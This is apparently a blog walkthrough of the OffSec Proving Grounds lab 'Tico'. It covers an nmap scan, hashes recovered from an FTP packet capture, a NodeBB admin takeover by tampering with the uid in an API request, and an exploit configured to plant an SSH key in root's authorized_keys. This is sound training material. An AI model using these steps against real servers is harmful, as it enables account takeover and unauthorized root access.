---
title: Tico
date: 2026-06-22T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - wireshark
  - python
  - ssh
  - ssh-keygen
  - NodeBB
  - Caido
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Tico"
---

“Life is hard. After all, it kills you.”   
– Katharine Hepburn

`nmap 192.168.216.143 -p- -sS -sC -sV --min-rate 5000`

![](Screenshot%202026-06-22%20at%2015.11.13.png)
![](Screenshot%202026-06-22%20at%2015.11.53.png)
![](Screenshot%202026-06-22%20at%2015.12.09.png)
![](Screenshot%202026-06-22%20at%2015.12.28.png)

![](Screenshot%202026-06-22%20at%2016.48.15.png)

![](Screenshot%202026-06-22%20at%2016.47.52.png)

![](Screenshot%202026-06-23%20at%2010.24.20.png)

Lets look a ftp first:

![](Screenshot%202026-06-22%20at%2017.05.26.png)

![](Screenshot%202026-06-22%20at%2017.04.56.png)

Admin password maybe?

![](Screenshot%202026-06-22%20at%2017.06.00.png)

Right click and follow conversation > tcp;

![](Screenshot%202026-06-22%20at%2017.15.02.png)

`$mongodb-scram$*1*YWRtaW4=*15000*CDTb3v9SwhwxAXb4+vZ32l0VsTvrLeKoGtDP4x0LH5WZgQ9xFMJEJknBHTp6N1D*zOa0kWA/OTak0a0vNaN0Zh2drO1uekoDUh4sdg==`
`r=+CDTb3v9SwhwxAXb4+vZ32l0VsTvrLeKoGtDP4x0LH5WZgQ9xFMJEJknBHTp6N1D,p=/nW1YVs0JcvxU48jLHanbkQbZ4GFJ8+Na8fj7xM1s98=`

`$mongodb-scram$*1*dXNlcg==*15000*qYaA1K1ZZSSpWfY+yqShlcTn0XVcrNipxiYCLQ==*QWVry9aTS/JW+y5CWCBr8lcEH9Kr/D4je60ncooPer8=`

According to the Offsec site there is a way to use this hash but it is unknown to me. Luckily there is a way to takeover the NodeBB admin account.

![](Screenshot%202026-06-23%20at%2008.15.00.png)

![](Screenshot%202026-06-23%20at%2008.26.08.png)

- Create a user and change the password.  
- Add the new password then use the intercept function in Caido or Burpsuite.

![](Screenshot%202026-06-23%20at%2009.04.41.png)

Find the API call and change the 'uid' to 1.

![](Screenshot%202026-06-23%20at%2009.07.14.png)

Now that we have an admin password we can use another NodeBB exploit.

Generate an ssh key:  
`ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa`  
`chmod 600 /tmp/id_rsa`

Update the python file:  
```
TARGET = 'http://192.168.144.143:8080'
USERNAME = 'admin'
PASSWORD = 'admin123'
DESTINATION_FILE = '/root/.ssh/authorized_keys'
SOURCE_FILE = '/tmp/id_rsa.pub'
```

![](Screenshot%202026-06-23%20at%2010.03.34.png)

SSH:  
ssh -i /tmp/id_rsa root@192.168.144.143

![](Screenshot%202026-06-23%20at%2009.56.52.png)